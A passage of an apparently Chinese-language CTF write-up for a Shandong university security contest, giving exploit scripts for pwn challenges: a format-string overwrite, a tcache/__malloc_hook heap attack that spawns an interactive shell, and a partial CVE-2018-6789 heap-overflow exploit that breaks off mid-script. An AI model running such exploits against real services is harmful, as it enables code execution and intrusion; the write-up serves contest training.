p.sendline(payload)</pre><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">最后调用<span class="Apple-converted-space">&nbsp;</span><code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">getFlag</code><span class="Apple-converted-space">&nbsp;</span>方法获取 Flag。</p><pre style="margin-top: 0px; margin-bottom: 16px; padding: 16px; border-radius: 3px; background-color: rgb(247, 247, 247); box-sizing: border-box; overflow: auto; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: 1.45; overflow-wrap: normal; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); text-size-adjust: auto;">payload&nbsp;=&nbsp;fmtstr_payload(4,{0x804a01c:0x08048616})
p.sendline(payload)</pre><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415553110447.png" alt="" style="box-sizing: border-box; border: 0px; max-width: 100%;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415821275308119.png" title="image.png" alt="image.png" width="528" height="182" style="width: 528px; height: 182px;"></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><strong style="box-sizing: border-box;">PS：Writeup的flag与比赛当时不同。</strong></p><h3 id="toc_110" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.43; font-size: 1.5em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">Pwn2 - bb_tcache</h3><h4 id="toc_111" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">题目描述</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">复现地址：<code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">nc 47.105.148.65 8888</code></p><h4 id="toc_112" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">考点</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">堆的利用。</p><h4 id="toc_113" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">解题过程</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">程序提供了<span class="Apple-converted-space">&nbsp;</span><code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">system</code><span class="Apple-converted-space">&nbsp;</span>地址，可计算出 libc 的地址，利用<span class="Apple-converted-space">&nbsp;</span><code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">__malloc_hook</code><span class="Apple-converted-space">&nbsp;</span>完成此题。</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415553527766.png" alt="" style="box-sizing: border-box; border: 0px; max-width: 100%;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415821543127881.png" title="image.png" alt="image.png" width="503" height="155" style="width: 503px; height: 155px;"></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;"><img src="./历届比赛-山东省大学生网络安全技能大赛_files/15415821902926282.png" title="image.png" alt="image.png" width="538" height="778" style="width: 538px; height: 778px;"></p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">解题脚本：</p><pre style="margin-top: 0px; margin-bottom: 16px; padding: 16px; border-radius: 3px; background-color: rgb(247, 247, 247); box-sizing: border-box; overflow: auto; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: 1.45; overflow-wrap: normal; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); text-size-adjust: auto;">#!/usr/bin/env&nbsp;python2
#&nbsp;coding:&nbsp;utf-8
#&nbsp;Usage:&nbsp;./exploit.py&nbsp;-r/-l/-d

from&nbsp;pwn&nbsp;import&nbsp;*
import&nbsp;argparse
import&nbsp;itertools


IP&nbsp;=&nbsp;"10.10.55.153"
PORT&nbsp;=&nbsp;30059

context.arch&nbsp;=&nbsp;"amd64"
context.log_level&nbsp;=&nbsp;'DEBUG'
context.terminal&nbsp;=&nbsp;['tmux',&nbsp;'splitw',&nbsp;'-h']
BIN&nbsp;=&nbsp;"./ez_heap"


def&nbsp;r(x):&nbsp;return&nbsp;io.recv(x)
def&nbsp;ru(x):&nbsp;return&nbsp;io.recvuntil(x)
def&nbsp;rud(x):&nbsp;return&nbsp;io.recvuntil(x,&nbsp;drop=True)
def&nbsp;se(x):&nbsp;return&nbsp;io.send(x)
def&nbsp;sel(x):&nbsp;return&nbsp;io.sendline(x)
def&nbsp;pick32(x):&nbsp;return&nbsp;u32(x[:4].ljust(4,&nbsp;'\0'))
def&nbsp;pick64(x):&nbsp;return&nbsp;u64(x[:8].ljust(8,&nbsp;'\0'))


parser&nbsp;=&nbsp;argparse.ArgumentParser()

parser.add_argument('-d',&nbsp;'--debugger',&nbsp;action='store_true')
parser.add_argument('-r',&nbsp;'--remote',&nbsp;action='store_true')
parser.add_argument('-l',&nbsp;'--local',&nbsp;action='store_true')
args&nbsp;=&nbsp;parser.parse_args()

io&nbsp;=&nbsp;None&nbsp;&nbsp;#&nbsp;this&nbsp;is&nbsp;global&nbsp;process&nbsp;variable

binary&nbsp;=&nbsp;ELF(BIN)

if&nbsp;args.remote:
&nbsp;&nbsp;&nbsp;&nbsp;context.noptrace&nbsp;=&nbsp;True
&nbsp;&nbsp;&nbsp;&nbsp;io&nbsp;=&nbsp;remote(IP,&nbsp;PORT)&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;libc&nbsp;=&nbsp;ELF("libc-2.27.so")
elif&nbsp;args.local&nbsp;or&nbsp;args.debugger:
&nbsp;&nbsp;&nbsp;&nbsp;env&nbsp;=&nbsp;{"LD_PRELOAD":&nbsp;os.path.join(os.getcwd(),&nbsp;"libc-2.27.so")}&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;env&nbsp;=&nbsp;{}
&nbsp;&nbsp;&nbsp;&nbsp;io&nbsp;=&nbsp;process(BIN,&nbsp;env=env)&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;io.libs()
&nbsp;&nbsp;&nbsp;&nbsp;proc_base&nbsp;=&nbsp;io.libs()[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;"/home/vagrant/cyberpeace/ADWorld/isc_quals/Jeopardy/pwn/ez_heap/source/ez_heap"]
&nbsp;&nbsp;&nbsp;&nbsp;libc_bb&nbsp;=&nbsp;io.libs()[&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'/home/vagrant/cyberpeace/ADWorld/isc_quals/Jeopardy/pwn/ez_heap/source/libc-2.27.so']&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;libc&nbsp;=&nbsp;ELF("/lib/x86_64-linux-gnu/libc.so.6")
&nbsp;&nbsp;&nbsp;&nbsp;libc&nbsp;=&nbsp;ELF("./libc-2.27.so")
else:
&nbsp;&nbsp;&nbsp;&nbsp;parser.print_help()
&nbsp;&nbsp;&nbsp;&nbsp;exit()
&nbsp;&nbsp;&nbsp;&nbsp;
def&nbsp;malloc_heap():
&nbsp;&nbsp;&nbsp;&nbsp;rud("4.&nbsp;quit!")
&nbsp;&nbsp;&nbsp;&nbsp;sel(str(1))
&nbsp;&nbsp;&nbsp;&nbsp;
def&nbsp;free_heap():
&nbsp;&nbsp;&nbsp;&nbsp;rud("4.&nbsp;quit!")
&nbsp;&nbsp;&nbsp;&nbsp;sel(str(2))
&nbsp;&nbsp;&nbsp;&nbsp;
def&nbsp;write_heap(payload):
&nbsp;&nbsp;&nbsp;&nbsp;rud("4.&nbsp;quit!")
&nbsp;&nbsp;&nbsp;&nbsp;sel(str(3))
&nbsp;&nbsp;&nbsp;&nbsp;rud("You&nbsp;might&nbsp;need&nbsp;this&nbsp;to&nbsp;tamper&nbsp;something.")&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;len(payload)&nbsp;&gt;&nbsp;8:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;log.critical("May&nbsp;be&nbsp;your&nbsp;PAYLOAD&nbsp;too&nbsp;long!!!!!!")
&nbsp;&nbsp;&nbsp;&nbsp;se(payload)
&nbsp;&nbsp;&nbsp;&nbsp;
if&nbsp;args.debugger:
&nbsp;&nbsp;&nbsp;&nbsp;gdb.attach(io,&nbsp;'''
&nbsp;&nbsp;&nbsp;&nbsp;b&nbsp;*0x{:x}
&nbsp;&nbsp;&nbsp;&nbsp;c
&nbsp;&nbsp;&nbsp;&nbsp;'''.format(
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;libc_bb&nbsp;+&nbsp;0x45254,&nbsp;&nbsp;#&nbsp;one&nbsp;gadget
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;)
&nbsp;&nbsp;&nbsp;&nbsp;)

ru("I&nbsp;think&nbsp;you&nbsp;might&nbsp;need&nbsp;this:&nbsp;")
system_addr&nbsp;=&nbsp;int(rud("\n").strip(),&nbsp;16)
libc.address&nbsp;=&nbsp;system_addr&nbsp;-&nbsp;libc.symbols["system"]
log.critical("libc.address:&nbsp;0x%x"&nbsp;%&nbsp;libc.address)

new_malloc_hook&nbsp;=&nbsp;libc.symbols["__malloc_hook"]&nbsp;#&nbsp;-&nbsp;0x20&nbsp;+&nbsp;0x5&nbsp;-&nbsp;0x8
log.critical("new_malloc_hook&nbsp;address&nbsp;for&nbsp;fastbin&nbsp;attack:&nbsp;0x%x"&nbsp;%&nbsp;new_malloc_hook)

malloc_heap()
free_heap()
write_heap(p64(new_malloc_hook))
malloc_heap()
malloc_heap()


one_gg&nbsp;=&nbsp;0x10a38c&nbsp;+&nbsp;libc.address
log.critical("one&nbsp;gadget&nbsp;address:&nbsp;0x%x"&nbsp;%&nbsp;one_gg)
one_gg&nbsp;=&nbsp;p64(one_gg)

content&nbsp;=&nbsp;one_gg
write_heap(content)

malloc_heap()

io.interactive()</pre><h3 id="toc_114" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.43; font-size: 1.5em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">Pwn3 - notepad</h3><h4 id="toc_115" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">题目描述</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">复现地址：<code style="box-sizing: border-box; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: normal; padding: 0.2em 0px; margin: 0px; background-color: rgba(0, 0, 0, 0.04); border-radius: 3px;">nc 47.105.148.65 7777</code></p><h4 id="toc_116" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">考点</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">cve-2018-6789， 堆溢出</p><h4 id="toc_117" style="white-space: normal; box-sizing: border-box; margin-top: 1em; margin-bottom: 16px; line-height: 1.4; font-size: 1.25em; position: relative; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">解题过程</h4><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">本题需要结合主要考察cve-2018-6789漏洞利用，题目逻辑中用到了存在漏洞的base64编码来进行密码校验，因此可以实现单字节溢出，可以覆盖堆块的size，实现extend chunk。</p><p style="margin-top: 0px; margin-bottom: 16px; white-space: normal; box-sizing: border-box; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); font-family: &quot;Helvetica Neue&quot;, Helvetica, &quot;Segoe UI&quot;, Arial, freesans, sans-serif; text-size-adjust: auto;">解题脚本：</p><pre style="margin-top: 0px; margin-bottom: 16px; padding: 16px; border-radius: 3px; background-color: rgb(247, 247, 247); box-sizing: border-box; overflow: auto; font-family: Consolas, &quot;Liberation Mono&quot;, Menlo, Courier, monospace; font-size: 13.6px; font-stretch: normal; line-height: 1.45; overflow-wrap: normal; caret-color: rgb(51, 51, 51); color: rgb(51, 51, 51); text-size-adjust: auto;">from&nbsp;zio&nbsp;import&nbsp;*

is_local&nbsp;=&nbsp;True
#is_local&nbsp;=&nbsp;False

binary_path&nbsp;=&nbsp;"./notepad"

libc_file_path&nbsp;=&nbsp;""
#libc_file_path&nbsp;=&nbsp;"./libc.so.6"

ip&nbsp;=&nbsp;""
port&nbsp;=&nbsp;0

if&nbsp;is_local:
&nbsp;&nbsp;&nbsp;&nbsp;target&nbsp;=&nbsp;binary_path
else:
&nbsp;&nbsp;&nbsp;&nbsp;target&nbsp;=&nbsp;(ip,&nbsp;port)
&nbsp;&nbsp;&nbsp;&nbsp;
def&nbsp;d2v_x64(data):
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;l64(data[:8].ljust(8,&nbsp;'\x00'))
&nbsp;&nbsp;&nbsp;&nbsp;
def&nbsp;d2v_x32(data):
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;l32(data[:4].ljust(4,&nbsp;'\x00'))
&nbsp;&nbsp;&nbsp;&nbsp;
def&nbsp;rd_wr_str(io,&nbsp;info,&nbsp;buff):
&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(info)
&nbsp;&nbsp;&nbsp;&nbsp;io.write(buff)
&nbsp;&nbsp;&nbsp;&nbsp;
def&nbsp;rd_wr_int(io,&nbsp;info,&nbsp;val):
&nbsp;&nbsp;&nbsp;&nbsp;rd_wr_str(io,&nbsp;info,&nbsp;str(val)&nbsp;+&nbsp;"\n")
&nbsp;&nbsp;&nbsp;&nbsp;
def&nbsp;get_io(target):
&nbsp;&nbsp;&nbsp;&nbsp;r_m&nbsp;=&nbsp;COLORED(RAW,&nbsp;"green")
&nbsp;&nbsp;&nbsp;&nbsp;w_m&nbsp;=&nbsp;COLORED(RAW,&nbsp;"blue")&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;#r_m&nbsp;=&nbsp;False
&nbsp;&nbsp;&nbsp;&nbsp;#w_m&nbsp;=&nbsp;False
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;#io&nbsp;=&nbsp;zio(target,&nbsp;timeout&nbsp;=&nbsp;9999,&nbsp;print_read&nbsp;=&nbsp;r_m,&nbsp;print_write&nbsp;=&nbsp;w_m)
&nbsp;&nbsp;&nbsp;&nbsp;io&nbsp;=&nbsp;zio(target,&nbsp;timeout&nbsp;=&nbsp;9999,&nbsp;print_read&nbsp;=&nbsp;r_m,&nbsp;print_write&nbsp;=&nbsp;w_m,&nbsp;env={"LD_PRELOAD":libc_file_path})&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;io
&nbsp;&nbsp;&nbsp;&nbsp;
from&nbsp;threading&nbsp;import&nbsp;Thread
def&nbsp;interact(io):
&nbsp;&nbsp;&nbsp;&nbsp;def&nbsp;recv_func():
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;True:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;try:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;output&nbsp;=&nbsp;io.read_until_timeout(timeout&nbsp;=&nbsp;1)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;except:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return

&nbsp;&nbsp;&nbsp;&nbsp;recv_thread&nbsp;=&nbsp;Thread(target&nbsp;=&nbsp;recv_func)
&nbsp;&nbsp;&nbsp;&nbsp;recv_thread.start()&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;True:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;send_data&nbsp;=&nbsp;raw_input()&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;send_data&nbsp;!=&nbsp;'':
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.writeline(send_data)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
def&nbsp;menu_choice(io,&nbsp;choice,&nbsp;prompt&nbsp;=&nbsp;"choice&gt;&nbsp;"):
&nbsp;&nbsp;&nbsp;&nbsp;rd_wr_int(io,&nbsp;prompt,&nbsp;choice)
&nbsp;&nbsp;&nbsp;&nbsp;
def&nbsp;add_record(io,&nbsp;name,&nbsp;passwd,&nbsp;content_size,&nbsp;content):
&nbsp;&nbsp;&nbsp;&nbsp;menu_choice(io,&nbsp;1)
&nbsp;&nbsp;&nbsp;&nbsp;rd_wr_str(io,&nbsp;"&gt;&nbsp;",&nbsp;name)
&nbsp;&nbsp;&nbsp;&nbsp;rd_wr_int(io,&nbsp;"&gt;&nbsp;",&nbsp;1)
&nbsp;&nbsp;&nbsp;&nbsp;rd_wr_str(io,&nbsp;"&gt;&nbsp;",&nbsp;passwd)
&nbsp;&nbsp;&nbsp;&nbsp;rd_wr_int(io,&nbsp;"&gt;&nbsp;",&nbsp;content_size)
&nbsp;&nbsp;&nbsp;&nbsp;rd_wr_str(io,&nbsp;"&gt;&nbsp;",&nbsp;content)
&nbsp;&nbsp;&nbsp;&nbsp;
def&nbsp;show_record(io,&nbsp;name,&nbsp;passwd):
&nbsp;&nbsp;&nbsp;&nbsp;menu_choice(io,&nbsp;2)
&nbsp;&nbsp;&nbsp;&nbsp;rd_wr_str(io,&nbsp;"&gt;&nbsp;",&nbsp;name)
&nbsp;&nbsp;&nbsp;&nbsp;rd_wr_str(io,&nbsp;"&gt;&nbsp;",&nbsp;passwd)

def&nbsp;edit_record(io,&nbsp;name,&nbsp;passwd,&nbsp;content_size,&nbsp;content):
&nbsp;&nbsp;&nbsp;&nbsp;menu_choice(io,&nbsp;3)
&nbsp;&nbsp;&nbsp;&nbsp;rd_wr_str(io,&nbsp;"&gt;&nbsp;",&nbsp;name)
&nbsp;&nbsp;&nbsp;&nbsp;rd_wr_str(io,&nbsp;"&gt;&nbsp;",&nbsp;passwd)

&nbsp;&nbsp;&nbsp;&nbsp;rd_wr_int(io,&nbsp;"&gt;&nbsp;",&nbsp;0)&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(content_size&nbsp;!=&nbsp;-1):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rd_wr_int(io,&nbsp;"&gt;&nbsp;",&nbsp;content_size)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rd_wr_str(io,&nbsp;"&gt;&nbsp;",&nbsp;content)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
def&nbsp;delete_record(io,&nbsp;name,&nbsp;passwd):
&nbsp;&nbsp;&nbsp;&nbsp;menu_choice(io,&nbsp;4)
&nbsp;&nbsp;&nbsp;&nbsp;rd_wr_str(io,&nbsp;"&gt;&nbsp;",&nbsp;name)
&nbsp;&nbsp;&nbsp;&nbsp;rd_wr_str(io,&nbsp;"&gt;&nbsp;",&nbsp;passwd)def&nbsp;pwn(io):

&nbsp;&nbsp;&nbsp;&nbsp;#offset&nbsp;info
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;is_local:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#local
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;offset_system&nbsp;=&nbsp;0x0
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;offset_binsh&nbsp;=&nbsp;0x0
&nbsp;&nbsp;&nbsp;&nbsp;else:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#remote&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;offset_system&nbsp;=&nbsp;0x0
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;offset_binsh&nbsp;=&nbsp;0x0

&nbsp;&nbsp;&nbsp;&nbsp;passwd&nbsp;=&nbsp;"deadbeef".encode("base64")&nbsp;+&nbsp;"\x00"
&nbsp;&nbsp;&nbsp;&nbsp;add_record(io,&nbsp;"0"*0x10,&nbsp;passwd&nbsp;+&nbsp;"\n",&nbsp;0x20-1,&nbsp;"test0\n");
&nbsp;&nbsp;&nbsp;&nbsp;add_record(io,&nbsp;"1"*0x10,&nbsp;passwd&nbsp;+&nbsp;"\n",&nbsp;0x210-1,&nbsp;"test1\n");
&nbsp;&nbsp;&nbsp;&nbsp;add_record(io,&nbsp;"2"*0x10,&nbsp;passwd&nbsp;+&nbsp;"\n",&nbsp;0x20-1,&nbsp;"test2\n");
&nbsp;&nbsp;&nbsp;&nbsp;add_record(io,&nbsp;"3"*0x10,&nbsp;passwd&nbsp;+&nbsp;"\n",&nbsp;0x20-1,&nbsp;"test2\n");
&nbsp;&nbsp;&nbsp;&nbsp;add_record(io,&nbsp;"4"*0x10,&nbsp;passwd&nbsp;+&nbsp;"\n",&nbsp;0x20-1,&nbsp;"test2\n");&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;#edit_record(io,&nbsp;"4"*0x10,&nbsp;passwd&nbsp;+&nbsp;"\n",&nbsp;0x20-1,&nbsp;"test2\n");

&nbsp;&nbsp;&nbsp;&nbsp;#io.gdb_hint()
&nbsp;&nbsp;&nbsp;&nbsp;delete_record(io,&nbsp;"1"*0x10,&nbsp;passwd&nbsp;+&nbsp;"\n")&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;#io.gdb_hint()
&nbsp;&nbsp;&nbsp;&nbsp;add_record(io,&nbsp;"1"*0x10,&nbsp;passwd&nbsp;+&nbsp;"\n",&nbsp;0xb0-1,&nbsp;"test1\n");&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;#io.gdb_hint()
&nbsp;&nbsp;&nbsp;&nbsp;#edit_record(io,&nbsp;"1"*0x10,&nbsp;passwd&nbsp;+&nbsp;"\n",&nbsp;0x80,&nbsp;"a"*0x10&nbsp;+&nbsp;"\n")
&nbsp;&nbsp;&nbsp;&nbsp;edit_record(io,&nbsp;"2"*0x10,&nbsp;passwd&nbsp;+&nbsp;"\n",&nbsp;0x58-1,&nbsp;"b"*0x10&nbsp;+&nbsp;"\n")&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;#io.gdb_hint()
&nbsp;&nbsp;&nbsp;&nbsp;edit_record(io,&nbsp;"3"*0x10,&nbsp;passwd&nbsp;+&nbsp;"\n",&nbsp;0xf8-1,&nbsp;"c"*0x10&nbsp;+&nbsp;"\n")&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;#io.gdb_hint()

